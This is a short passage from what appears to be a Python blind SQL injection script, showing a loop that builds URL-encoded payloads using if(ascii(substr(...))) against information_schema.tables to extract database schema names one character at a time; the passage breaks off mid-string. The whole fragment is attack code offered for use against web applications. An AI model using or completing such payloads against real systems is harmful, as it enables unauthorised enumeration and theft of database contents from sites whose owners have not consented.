...
for tablenum in range(0,20):
    payload1_attack = "1%27%20and%20if(ascii(substr((select%20table_schema%20from%20information_schema.tables%20where%20%271%27=%271%27%20group%20by%20table_schema%20limit%20"+str(tablenum)+",1),"
